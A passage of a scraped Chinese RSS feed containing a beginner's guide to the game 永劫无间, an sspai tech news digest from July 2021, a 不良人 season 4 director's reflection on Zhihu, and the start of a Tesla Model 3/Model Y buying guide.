data-watermark-src=\"v2-ded1301266f7c32c990fbeb0c8cfc8c0\" data-private-watermark-src=\"v2-e8f8bb6f20e645a126e1f20f63d987a9\"></p>\n<p><b>2.游戏内符文——魂玉</b></p>\n<p>而另一点和其他大逃杀不同的在于这个游戏中有一个内置的魂玉系统，分为<b>属性魂玉</b>（加防加攻等）、<b>特殊魂玉</b>（加速冷却、减少消耗等）、<b>近战武器魂玉</b>（给特定的近战武器加成等）和<b>远程武器魂玉</b>（给特定的远程武器加成等）这四大类。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3839349e7da0252dca20161520314048_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"同时建议先去自由练习那里熟悉一下游戏内的各种内容\" data-watermark=\"watermark\" data-original-src=\"v2-3839349e7da0252dca20161520314048\" data-watermark-src=\"v2-ca71ca9ffbd7f594ecce755602ad1f3e\" data-private-watermark-src=\"v2-772e7a2aa81224251c15ee09f062624b\"></p>\n<p>其实分清楚这几大类之后也没什么好讲的了，因为在游戏中主要捡拾装配的就是<b>【属性魂玉】</b>这一种，个人习惯就是近抗、远抗、然后剩下全加攻。</p>\n<p>另外就是别装配跟自己所持武器无关的魂玉，就好比你看到有个远程武器魂玉，但是你手里全是近战武器，又或者你看到的魂玉是给阔剑加成的，而你手里是两把太刀，那这种就没有必要了（除非你专门为了魂玉换武器）。</p>\n<p>而魂玉的获得途径主要也是四种：1.从魂玉点（和装备点不一样，魂玉点是绿色的一堆）获得；2.从装备点或地上捡获得；3.从地图内的商店（普通商店和飓风客）那里购买；4.从敌人的包里拿。</p>\n<p><b>3.游戏内商店——货郎</b></p>\n<p>当然了“买点”这个设定就不是很稀奇了，像《使命召唤：战区》里也有类似的设定，玩家在搜集金币之后可以去购买所需的装备。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-460f34873107fafaf25bf35d8f0e55d4_720w.jpg?rss\" data-rawwidth=\"1590\" data-rawheight=\"739\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-460f34873107fafaf25bf35d8f0e55d4\" data-watermark-src=\"v2-031f967d2098daca1fed72e63fe6ca22\" data-private-watermark-src=\"v2-4b52b021d8350108f1725a2c871e7a6a\"></p>\n<p>这里需要提一下的就是飓风客这种定时不定点刷新的买点，可以说去飓风客这里获取装备是一种“赌命行为”，因为这个买点太过扎眼，很容易被群起而攻之或者被埋伏偷袭，但是奖励太过丰厚（高等级装备且免费），确实值得一搏，毕竟搏一搏单车变摩托。</p>\n<p>拿完就跑真的刺激！</p>\n<p><b>4.走位、突击、脱战——飞索</b></p>\n<p>而这个游戏最有乐趣的一个设定大概就是飞索了，因为近战远程武器以及技能的这些多样设定，使得这个游戏其实很难做到像其他大逃杀游戏中“把人秒了”，而和人战斗普遍也都是近距离（近战）或者中近距离（近战/远程），如果身法足够，打不过就跑也是能够做到的。</p>\n<p>而飞索则是一个能够<b>迅速让玩家拉近距离加入战团、勾住敌人乘胜追击或者在状态不行时及时脱战的装备。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-31730def3ee9b1db15310e9f6c2061c2_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-31730def3ee9b1db15310e9f6c2061c2\" data-watermark-src=\"v2-a5b76afba6110d66471db1d1dd9c9f0c\" data-private-watermark-src=\"v2-36980f9ea244a5b24621eb14fbe53c21\"></p>\n<p>飞索的原本按键是Q（发动）+左键（锁定），不过我个人根据个人习惯改成了鼠标下侧键+左键。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7fd631a56720e72c92ef066b8d04e95c_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7fd631a56720e72c92ef066b8d04e95c\" data-watermark-src=\"v2-de5b9a3b8f434c641ab4ef8a8fc4d116\" data-private-watermark-src=\"v2-deae49417ae25f969bf7da8bc8f9377e\"></p>\n<p><b>PS：</b>不能自定义多键对应一动作是真的难受，这一点真的强烈希望网易进行一下改进。</p>\n<p>可以说飞索是在这个游戏中除了基本战斗操作外最重要的一点（一定要学好），灵活的身法有时候是可以弥补一定的战斗劣势的。</p>\n<p>而除了飞索之外，游戏中的加速走位方式同样也有滑铲（这个应该很多玩家都很熟悉，像《使命召唤：战区》、《APEX英雄》都有滑铲这一动作），不过个人感觉滑铲存在的问题和飞索类似，在《永劫无间》里将Ctrl键和C键分做了不同用处，有点破坏玩家习惯。</p>\n<p><b>PS：</b>Ctrl竟然是慢走！慢走！慢走！为什么我要在大逃杀游戏里慢走?我就算躲人我蹲着走不行么?</p>\n<p><b>5.装备容量</b></p>\n<p>上面也提到过这个游戏是很难秒人的，所以在大部分情况下，护甲的需求都是远高于血量的需求的，所以护甲药的需求量也要比血药高很多。</p>\n<p>个人习惯的话，在最终阶段就是大护甲药保持4-6个，大血药保持2个（因为一般都没命打），飞索保持12-18个，剩下的则是装备匣。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-57ca514653deac50115137a70d4fbfd9_720w.jpg?rss\" data-rawwidth=\"353\" data-rawheight=\"224\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-57ca514653deac50115137a70d4fbfd9\" data-watermark-src=\"v2-c3ab50c016d3c344bc312c21886464f7\" data-private-watermark-src=\"v2-52fc03b30f4e63cf577f47c1591b1341\"></p>\n<p><b>6.换弹？修复武器——装备匣</b></p>\n<p>装备匣应该也算是这个游戏中比较特殊的一点，因为在游戏中无论是近战武器还是远程武器，进行战斗都会有所消耗（消耗到0时就用不了了），而装备匣就是用于修补消耗值的。</p>\n<p>而装备匣的对应按键就是寻常大逃杀和FPS游戏上弹时的R键，所以这个游戏大概多少可以治好你的换弹癌（滑稽）。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bab06783b80b8e53bcee11924d559f9e_720w.jpg?rss\" data-rawwidth=\"562\" data-rawheight=\"365\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bab06783b80b8e53bcee11924d559f9e\" data-watermark-src=\"v2-8612c27e0cba77be9143f8ccc948fc92\" data-private-watermark-src=\"v2-4d25fdbabd0310dd353c559dc4794f5a\"></p>\n<p><b>PS：</b>游戏中有一个魂玉的名字叫毕工淌就是搭配修复装备的，不过很少见是真的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ac10886b97cce00b9c1a5ee8c969ccf0_720w.jpg?rss\" data-rawwidth=\"727\" data-rawheight=\"303\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ac10886b97cce00b9c1a5ee8c969ccf0\" data-watermark-src=\"v2-93b6979c253d3e83fe164acb716a2e6b\" data-private-watermark-src=\"v2-060ade94292acaf128486dd8cc6e5d0e\"></p>\n<p><b>7.近战须知——振刀</b></p>\n<p>把振刀理解成弹反即可，这也是在近战与敌人缠斗的时候一种极为有效的反击手段（振刀可以把敌人的武器打掉），鼠标左右键同事按或者按鼠标上侧键即可触发。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d4fe6546f655af95584e050e3dee8c11_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d4fe6546f655af95584e050e3dee8c11\" data-watermark-src=\"v2-1c86d50ab149835c3185521df8e7485b\" data-private-watermark-src=\"v2-e3d8f06ec2e72e6f5ce7358106ad1abb\"></p>\n<p>严格来说这招我现在也没用熟练，不过这一招也确实算是除了飞索外最需要学会的一种手段（有奇效）。</p>\n<p><b>8.战术、意识</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-11498d4d1cb37a83041ffb3541ce8bec_720w.jpg?rss\" data-rawwidth=\"737\" data-rawheight=\"479\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-11498d4d1cb37a83041ffb3541ce8bec\" data-watermark-src=\"v2-b5bea30158b8594eb6395adde1d15c38\" data-private-watermark-src=\"v2-c555040d8464db496303e96592f10d45\"></p>\n<p>因为我的战斗水平并不是很强悍的那种，所以我在玩大逃杀游戏的时候也不喜欢莽上去直接加入别人混战的战团（因为这样很可能会成为别人混战的牺牲品）。</p>\n<p>而在《永劫无间》中，结合“飞索”、“很难秒人”这些特性，<b>“偷人”</b>本身也成了一种很常规的战术，等敌方两人消耗的差不多了自己使用飞索前去一顿输出收人头，然后事了拂衣去，深藏功与名。</p>\n<p><b>年轻人就该不讲武德（滑稽）。</b></p>\n<p>另外如果是多人组队的话，其实也可以注意一下阵容搭配（搭配一个奶）等。</p>\n<p><b>9.学习建议</b></p>\n<p>如果对游戏中的设定不太熟悉的话，其实建议在进行完开始的操作教学之后先去自由练习熟悉一下装备和魂玉，然后在去进阶教学体验上一小把，在这之后对游戏的理解就能深刻不少了。</p>\n<p>而在游戏中也有许多的小资源，例如消除脚步的蒲公英、回复护甲和血量的沙叻果，以及一些特殊的委派任务等等，这些格外的内容往往也会给游戏过程增加不少乐趣。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2af86c25564dfe7259854d54c5ed299d_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2af86c25564dfe7259854d54c5ed299d\" data-watermark-src=\"v2-43bb6b8bee1929537af205ac3b5e2c79\" data-private-watermark-src=\"v2-0d545f0ee10f7b51b4c26306bcdf4993\"></p>\n<p><br></p>\n<p>最后附上今中午刚刚打的一把：</p>\n<a href=\"https://www.zhihu.com/zvideo/1396505019567517696\">永劫无间：新手的快乐想象不到</a>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jin-xi-ri-52?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">锦曦日</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470627425/answer/1986211962?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">13 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/276588849?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">新手教程都能死是一种什么体验？</a><br><a href=\"http://www.zhihu.com/question/264666086?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有哪些游戏的新手教程的设计十分精彩/别出心裁？</a><br>\n","link":"http://www.zhihu.com/question/470627425/answer/1986211962?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：萤石发布 BC2 电池摄像机、支付宝正式上线长辈模式等","date":"2021-07-09 01:00:00","description":"\n<h2>萤石发布 BC2 电池摄像机</h2>\n<p>7 月 8 日，萤石正式发布 BC2 电池摄像机，该摄像机采用了黑色小巧的外观设计，配备 200 万像素摄像头和 F1.6 大光圈，采用了 2000mAh 大电池，续航能力预计为 50 天，支持夜视能力以及高速唤醒抓拍，售价 399 元。<a href=\"https://weibo.com/3196768015/KnNMO097c\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/2327e7bc8fe732bd28ebb65818bc34f1\"></figure><h2>支付宝正式上线长辈模式</h2>\n<p>7 月 8 日，支付宝官方宣布，正式上线长辈模式的功能，该功能修改了原本的布局，采用了大图标大字体的设计，并去除了一些老年人不常用的功能和营销项目，用户可以通过搜索「长辈模式」进行开启，或在【我的】-【设置】中开启。<a href=\"https://weibo.com/1891502860/KnL4ma0Tz\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/eaade932c89b5503fc1551dc19076125.jpeg\"></figure><h2>高通华硕合作推出面向骁龙粉丝的手机</h2>\n<p>7 月 8 日，高通和华硕宣布合作打造 Smartphone for Snapdragon Insiders，包括了一部定制手机和一副由 Master &amp; Dynamic 公司生产的带有 Snapdragon Sound 音效的真无线耳机。</p>\n<p>手机采用了 6.78 寸 FHD+ 144Hz Super AMOLED 屏幕，最高亮度为 1200 nits；处理器方面搭载骁龙 888 处理器，配备 16GB LPDDR 5 和 512GB 存储，内置 4000mAh 电池，支持 Quick Charge 5 快充，这款手机还将保留 3.5mm 接口，售价是 1,499 美元。<a href=\"https://cn.engadget.com/qualcomm-asus-smartphone-snapdragon-insiders-163814518.html?guccounter=1\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/b8121b48e36540a3aaa7f7fe794a8a1d\"></figure><h2>腾讯将采用人脸识别技术进行未成年人防沉迷</h2>\n<p>7 月 8 日，腾讯即将引入全新的人脸识别系统开启「零点巡航」措施，来对未成年人的游戏时间段进行严格管控，避免未成年人在 22 点到次日 8 点的时间进行游戏，并弥补了实名制的不足性。<a href=\"http://www.sixthtone.com/news/1007915/tencent-deploys-facial-recognition-to-detect-minors-gaming-at-night-\" target=\"_blank\">来源</a></p>\n<h2>Pixel 6 系列最终规格泄露</h2>\n<p>知名报料人 Jon Prosser 于 7 月 8 日曝光了 Pixel 6 系列的最终硬件规格，首先 Pixel 6 屏幕为 6.4英寸的 AMOLED 屏幕，后置相机为 5000 万像素主摄+ 1200 万像素广角，前置则为 800 万像素，电池 4614mAh，运存为 8GB，内置存储为 128GB/256GB。</p>\n<p>更高阶的 Pixel 6 Pro 屏幕为 6.71 英寸的 AMOLED 屏幕，后置相机为 5000 万主摄 + 4800 万像素长焦 + 1200 万像素广角，前置位 1200万像素，电池 5000mAh，运存为 12GB，存储可选 128GB / 256GB / 512GB。</p>\n<p>两款手机都搭载了 Google 和三星合作的 Whitechapel 处理器，内置有定制的神经处理单元，运行最新的 Android 12 。<a href=\"https://www.phonearena.com/news/google-pixel-6-pixel-6-pro-leaked-specs-features_id133469\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/eb2d04df10fbf4e4775cc55f08fc2dfe\"></figure><h2>银保监会宣布 7 月 25 日调整 ATM 跨行取现手续费</h2>\n<p>在 7 月 8 日举行的国务院政策例行吹风会上，中国银行保险监督管理委员会、消费者权益保护局局长郭武平就「降低自动取款机跨行取现手续费」进展做出解答，表示跨行取现费率降低至每笔 3.5元，并将从 7 月 25 日开始正式实施。<a href=\"https://finance.sina.com.cn/roll/2021-07-08/doc-ikqciyzk4285309.shtml\" target=\"_blank\">来源</a></p>\n<h2>一加证实一加 9 系列会限制 App 性能以延长续航</h2>\n<p>AnandTech 在测试一加 9 系列手机时发现，一加 9 会针对性地限制某些应用调用大核，导致运行某些软件时出现卡顿。对此一加在 XDA 论坛进行解释称，由于两款手机都搭载了骁龙 888 导致续航不足，因此一加 9 系列手机采用了分配不同核心的方式来延长电池续航时间。<a href=\"https://www.anandtech.com/show/16794/oneplus-9-performance-examination\" target=\"_blank\">来源</a></p>\n<h2>华东师范大学和微软推出中文写作智能辅导系统「小花狮」</h2>\n<p>在 2021 世界人工智能大会「AI 赋能教育数字化转型论坛」上，微软亚洲研究院和华东师范大学共同签署了促进智能教育研究的合作备忘录，双方率先从语音教学入手，联合推出中文写作智能辅导系统「小花狮」，该系统将利用现有的中文教学知识的研究成功，结合自然语言处理，不仅可以让学生获得作文评分结果，还能让其了解评分背后的原因，持续改进学习方法，提升写作与阅读能力。同时人工智能技术也将辅助老师了解不同学生的特点，因材施教，实施更有针对性的教学。<a href=\"https://finance.sina.com.cn/chanjing/gsnews/2021-07-08/doc-ikqcfnca5686051.shtml\" target=\"_blank\">来源</a></p>\n<h2>微博支持国行 Nintendo Switch 一键分享</h2>\n<p>7 月 8 日，微博游戏官方宣布，微博现已支持腾讯引进 Nintendo Switch 分享功能，只用扫码登录微博即可绑定账号，后期选择截图或者视频即可分享。<a href=\"https://weibo.com/6613432328/KnLwvC714?type=comment#_rnd1625784783713\" target=\"_blank\">来源</a></p>\n<h2>你可能错过的文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/67218\" target=\"_blank\">🎫 订票、选座、值机：为你解答那些关于机票的「为什么」</a></li>\n<li><a href=\"https://sspai.com/post/67586\" target=\"_blank\">✈️ 快乐飞旅行报告 08：汕头的牛肉能尝出甜味</a></li>\n<li><a href=\"https://sspai.com/post/67598\" target=\"_blank\">✏️ 一派·再读 05：互联网时代的创作</a></li>\n<li><a href=\"https://sspai.com/post/67612\" target=\"_blank\">🆕 新玩意 070｜少数派的编辑们最近买了啥？</a></li>\n<li><a href=\"https://sspai.com/post/67607\" target=\"_blank\">👉 27 万的 Model Y 来了，现在买特斯拉该怎么选</a></li>\n</ul>\n<p>&gt; 来聊聊你的 BGM，欢迎参加<a href=\"https://sspai.com/bullet/1625539421\" target=\"_blank\">「一派」讨论</a> 🎵</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67623"},{"title":"如何评价《画江湖之不良人》第四季第十三集？","date":"2021-07-08 11:30:08","description":"\n<p>大家好，我是舒，播又来。今天最后一篇，至此12篇知乎的任务完成。</p>\n<p><br></p>\n<p>先闲聊两句吧！从2015年参与不良人2编剧至今已有六年，做导演这还是头一回。在紧紧巴巴的时间里磕磕碰碰，总算是完成了不良人4的所有内容，虽遗憾颇多，但只能到此为止。</p>\n<p>六年了，今天也该告别了。</p>\n<p><br></p>\n<p>五、六季的不良人中，我将不会再担任编剧与导演，只是负责与剧本监督一起敲定剧情走向与结局等“大方向”类的内容，剧本层面则由我们的编剧李皖青与李佳炫主笔，再加上导演李帅帅，往后是李家人的天下啦！</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-a4037b691bc682d6db7f3490fd7bc25a_720w.jpeg?rss\" data-caption=\"上：李帅帅        左下：李皖青        右下：李佳炫\" data-size=\"normal\" data-rawwidth=\"4032\" data-rawheight=\"4030\" data-watermark=\"watermark\" data-original-src=\"v2-a4037b691bc682d6db7f3490fd7bc25a\" data-watermark-src=\"v2-f26bc87029df41a644e2460c33668895\" data-private-watermark-src=\"v2-6be3457b067d375f7c8c653a74af8fd2\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b7a926e0fbe0c88a117921a955afeaa6_720w.jpeg?rss\" data-caption=\"剧本监督     左：于奥       右：周铁男\" data-size=\"normal\" data-rawwidth=\"3648\" data-rawheight=\"5472\" data-watermark=\"watermark\" data-original-src=\"v2-b7a926e0fbe0c88a117921a955afeaa6\" data-watermark-src=\"v2-56391ed6bec2eedd6e4ebdd131d09bbc\" data-private-watermark-src=\"v2-281ea9d913d7ab9309975e850d1ea82c\"></p>\n<p>虽不再参与制作，但在闲暇时间我和李导偶尔也会交流一些后续内容，还参与了第五季OP画面的构思，我记得那天跟李导听着片头曲聊片头的时候还是很开心的！对了，在这里还要感谢一下不良人第四季的镜头导演由于13集片尾没有放入他们的照片，在这里补上！</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-9dc441c6eb117fe42df592c9af4c8932_720w.jpeg?rss\" data-caption=\"左上：白玥萌        下：张翔       右上：任伟杰        上面的两位不愿意露脸\" data-size=\"normal\" data-rawwidth=\"3024\" data-rawheight=\"4030\" data-watermark=\"watermark\" data-original-src=\"v2-9dc441c6eb117fe42df592c9af4c8932\" data-watermark-src=\"v2-c01cdc7acfdb8e8fb99c20de4ab0b67d\" data-private-watermark-src=\"v2-3c074082baf3a5672f0ea33631f202f2\"></p>\n<p> 感谢作曲丁培峰老师和作词海雷老师的付出，创作出了歌曲《蛊》。之前听过他们合作的那首《不染》就很惊艳。在创作这首歌时是先词后曲的，海雷老师一共出了三版词，前两版的词也十分成熟，只是因为我个人喜好因而并未采纳，最终《蛊》的词出来一下子感觉就对了，十分简单明了的歌词，毫不矫情。最终这版词也没有做任何修改，作曲丁老师那边我更是完全没有操过任何心。毕竟有两位大神出马，我就在家乖乖等着发歌了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-be0dd0bbea8d7fbfa53ec8e0a44b01c9_720w.jpeg?rss\" data-caption=\"三个版本的歌词\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-be0dd0bbea8d7fbfa53ec8e0a44b01c9\" data-watermark-src=\"v2-4be08e917b3bf31f80d227e5aa0ed2d6\" data-private-watermark-src=\"v2-fb3b1d9425259e057463cb18e84cacd1\"></p>\n<p>还有一个遗憾还是想说一下，最后蚩梦母亲的镜头被不可抗力了，因而替换成了一只手，由于做的仓促效果并不理想，如果有剪辑帝的话，可以尝试把这个镜头放到正片里的位置试试看，效果会完全不同。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a89cb3356e7734c62baa0f0246239faa_720w.jpeg?rss\" data-caption=\"预告片中这个镜头我认为效果比较好，但正片中无法出现\" data-size=\"normal\" data-rawwidth=\"2337\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-a89cb3356e7734c62baa0f0246239faa\" data-watermark-src=\"v2-571d681a2c090d0485ad76bbd4bcf958\" data-private-watermark-src=\"v2-d56d67186bf32f88b640a434ba8ff157\"></p>\n<p>第四季最初叫做娆（苗）疆篇，因此会有许多观众认为此剧与不良人并无太大关系。大家不必担心，从第五季开始剧情将会回归主线内容。之前关于蚩梦与尤川的问题没有回复大家，只是因为不想做过多的引导，影响大家的观感。网上各种瞎传也只能当没看见，好家伙星雪凡轩蚩尤六个人死了个遍，连我妈都问我蚩梦是不是要死了……往后还是以看正剧为准吧，包括片头的内容也别轻易相信，蒙眼等细节只是跟“五感”有关而已。当然，经历了这么多，最让人灰心的还是在网络上出现了自己人的“图透”，不过都过去了，就不多提了。</p>\n<p>本季的创作初衷主要是想填一下曾经给娆疆那边挖过的坑，还要彻底解决蚩梦对李星云的爱恋之情。</p>\n<p>其实本季我们大可以避开这些“雷区”，不写、少写情感戏，或按照粉丝的想法组CP，将许多人物的曾经不了了之。但最后我们还是选择了做一件自己不后悔的事儿。包括今天的更新，用官方口径说“绝对安全”的话没意思，既然说了，就说点儿真正想说的，也能给关心不良人的观众一个答案。我们天津有个相声大师经常会说，观众就是衣食父母嘛，因此无论是黑是吹或是随便看看，只要大家是我们的观众，我们都是会重视的，谢谢你们的观看。</p>\n<p>作为主创，我认为在第二季中蚩梦与李星云所发生的一切，不能因为第三季出现了高热度的角色就当做不存在了，就像无论谁出现也不会影响李星云对姬如雪的情感一样，毕竟不良人系列是一个连续的故事。部分粉丝们过滤掉不利于自己的内容很正常，因为观众就应该是爱怎么看剧就怎么看剧，但我们不能这么做。</p>\n<p>蚩梦对于李星云的情感并不属于一见钟情，这与尤川对于蚩梦的情感设定比较相似——都是由于长时间接触而慢慢产生情感。自第二季“进房间两次”事件后，蚩梦虽以“小”自居但仍不甘愿，直到经历漠北与天山后才真对李星云正动情，且一往而深。关于天山圣女引出情蛊的结局早在第二季创作蚩梦的角色时就已想基本好，因此我们从没考虑过李星云有其他情感线的可能，但蚩梦的CP线确是在尤川出现后考虑过更换的，不过最后还是放弃了——因为没有合适的篇幅来解决她对李星云的情感。如果让蚩梦在心里有李星云的情况下喜欢其他人，这个角色将彻底崩掉，且不说李星云在场时他们的戏如何行进，新观众们很有可能对这个不纯粹的女孩再也喜欢不起来，到时候里外不是人的局面会更难收场。可如果用分量不够的方式解决她对李星云的情感，又会觉得第二季的剧情太儿戏。蚩梦对于李星云的付出有目共睹，她对李星云会是对“哥哥、亲人”的情感吗？或者她自己也不知道什么是喜欢吗？我只能说这种强行的话我说不出来。第二季的故事网上都能看，曾经“某运营人员”放出“哥哥、亲人、不知道啥是喜欢”这种话来引导观众，我认为是不负责任的做法，是不尊重观众与创作者的做法，也有可能是趁着尤川比较火出现的急功近利的做法。</p>\n<p>最终，我们决定在第四季终结这段许多人看来是“错误”的情感，给予蚩梦未来更多的可能性。“如果能不死，就不再喜欢了。”</p>\n<p>我一直觉得无论是做错了事，亦或是爱错了人，都该有相应的果报。也许现在这个时代许多人更愿意追求个好结果，但我还是会认为过程同样重要，没有好结果并不代表过程没有意义。我其实很不想把注定没有结果的情感说成是错误的情感，但也没办法，人在江湖，总是要跟着规矩活的。</p>\n<p>因此，蚩梦单纯而自由的人生观造成了她在情感上有这样的苦果，也是对她喜欢上李星云这件事的报，而我唏嘘这样的结局，是对我们写下了这段情感的报。</p>\n<p>有些情感是一张字条。是既见君子，云胡不喜。</p>\n<p>有些情感是一次争吵。是她有什么好，我哪里及不上她，你老是想着她，老是忘不了她。</p>\n<p>有些情感是一句告别。是身在波斯，日日祝公子福体康宁，诸事顺遂。</p>\n<p>可无论过程多苦，不管是尤川对蚩梦，蚩梦对老李，还是老李对姬如雪，我想只要是正向而单纯的情感，就应该是值得人去在意的。直到最后的最后，再了断过去，重新开始。</p>\n<p><br></p>\n<p>一个故事播出来，这个故事里的人物和剧情在某种意义上就不属于主创的了，而是属于观众的。我不清楚最终尤川留在十二峒修行，蚩梦统领万毒窟是不是个好结局，但他们之后各自都有更多的空间和可能了。不过以后的可能是什么，就得看以后的编剧啦！而且至少写作时不会再因一些“历史遗留”问题而束手束脚了，我也希望他们再出现时，都成长为可以独当一面的人物吧！<i>（毕竟尤川放走的蝴蝶只是盘旋，并没有飞走。靠这个我都说了，本来不想说的）</i></p>\n<p>关于侯卿在本季的节点，我们并没有交待，请大家继续往下看吧。</p>\n<p>下一季回到了老李和雪儿的主场，之后他们是如何携手前行的，就请大家拭目以待。<i>（我也想看，先在这里催个更……赶紧播…然后本集片尾放的是第五季的预告，不是什么大电影！！据我所知，动画大电影很有可能会有的！）</i></p>\n<p>回顾画江湖系列，之前若森数字的每一个导演都与团队拼劲全力，不断的试错、绕路、摸索着前进的方向。无论未来的路平摊还是颠簸，我都相信，若森有这样一群认真的人，一定会变得越来越强大。</p>\n<p><br></p>\n<p>若森加油，国漫加油！886！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/cheng-zi-duo-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">橙子多</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469383435/answer/1985890753?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">274 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/467001152?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待《画江湖之不良人》第四季第11集？</a><br><a href=\"http://www.zhihu.com/question/465504311?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《画江湖之不良人》第四季第 11 集？</a><br>\n","link":"http://www.zhihu.com/question/469383435/answer/1985890753?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"27 万的 Model Y 来了，现在买特斯拉该怎么选","date":"2021-07-08 10:00:00","description":"\n<p>悄悄地，特斯拉又上新了，27.6 万的 Model Y，应该是目前最具竞争力的电动 SUV，这样一来，Model 3 和 Model Y 一共有五个车型，很多准车主可能都在困惑，自己应该怎么选，作为开过两款车，在西部跑了一万公里的过来人，整理一下思路，给大家提供一点个人建议。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/ec13a72d38143ff4b96ece53d69b8dc1\"><figcaption>Model Y 和 Model 3 的侧面对比</figcaption></figure><p>首先说说 Model 3 和 Model Y 的定位区别和驾驶差异点，刚好这两款车都我都有足够的使用场景和经验，分析起来相对比较全面。Model S 和 Model X 属于豪华车，不在本次讨论范围。</p>\n<h2>Model 3 犀利的小轿跑</h2>\n<p>虽然 Model Y 上市之后，Model 3 有点失宠过气的感觉，但开过一年的小 3，我仍然认为它是一款经典的、优秀的家用小轿车。首先是外观设计上，更和谐而灵动，相比之下，基于 3 改胖了的 Model Y 就略显臃肿，Y 毕竟不像 Model X 是一个全新设计的 SUV 车型，所以在整体外观上是不如 3 匀称好看的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/article/c534a4aabfa7a33860ece5b98c9908bd\"><figcaption>匀称好看的整体线条</figcaption></figure><p>开起来的感觉也不一样，Model 3 接近轿跑车型，坐姿很低，有很强的人车合一感，同时车身小巧，更容易把控距离，方向盘也更精准，开起来有种莫名的爽感。而 Y 是没有这种感觉的，虽然它们百公里加速几乎一样，但由于 Y 的坐姿高，车身大，所以驾驭感要差一截，没法跟 3 直接比较。所以，你是更在意日常驾驭感，还是更需要空间实用性，是选择两款车的关键。</p>\n<h2>Model Y 多功能旅行车</h2>\n<figure class=\"image ss-img-wrapper\"><img 